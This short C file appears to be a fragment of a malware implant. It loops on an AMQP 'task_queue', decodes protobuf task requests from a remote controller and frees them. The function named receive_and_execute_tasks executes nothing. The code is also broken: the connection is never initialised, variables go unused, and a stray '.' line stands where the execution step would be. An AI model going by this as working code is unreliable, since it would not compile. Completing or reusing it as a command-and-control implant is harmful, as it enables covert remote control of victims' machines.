#include <amqp.h>
#include <amqp_tcp_socket.h>
#include "implant.pb.h"
#include "implant.pb.c"   

void receive_and_execute_tasks() {
    amqp_connection_state_t conn;
    amqp_socket_t *socket = NULL;
    int status;



    // Listen for messages on the task_queue
    amqp_basic_consume(conn, 1, amqp_cstring_bytes("task_queue"), amqp_empty_bytes, 0, 1, 0, amqp_empty_table);
    while (1) {
        amqp_rpc_reply_t res;
        amqp_envelope_t envelope;

        amqp_maybe_release_buffers(conn);
        res = amqp_consume_message(conn, &envelope, NULL, 0);

        if (AMQP_RESPONSE_NORMAL != res.reply_type) {
            break;
        }

        // Deserialize the message using protobuf
        TaskRequest *task_request;
        task_request = task_request__unpack(NULL, envelope.message.body.len, envelope.message.body.bytes);
        if (task_request == NULL) {
            fprintf(stderr, "Error decoding task request\n");

        }
.

        task_request__free_unpacked(task_request, NULL);
        amqp_destroy_envelope(&envelope);
    }


}

int main() {
    receive_and_execute_tasks();
    return 0;
}
